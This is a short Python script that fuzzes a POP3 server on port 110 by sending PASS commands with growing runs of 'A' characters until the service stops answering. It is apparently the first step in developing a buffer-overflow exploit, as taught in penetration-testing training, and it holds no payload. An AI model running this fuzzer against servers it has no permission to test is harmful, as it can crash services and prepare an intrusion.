#! /usr/bin/python

import socket
import sys

if len(sys.argv) != 2:
    print("[-] usage: fuzz.py <ip address>")
    exit()

_host = str(sys.argv[1].strip())
_port = 110
_buffer = ""

for i in range(100, 5000, 100):
    _buffer = "A"*i
    try:
        print("[+] Connecting with buffer size " + str(len(_buffer)))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        
        s.connect((_host, _port))
        banner = s.recv(1024)

        s.send("USER test \r\n")
        data = s.recv(1024)

        s.send("PASS " + _buffer + "\r\n")
        s.send("QUIT\r\n")
        s.close()

    except:
        print("[-] Cannot connect to POP3 Server")
        print("Buffer size:" + str(len(_buffer)))
        exit()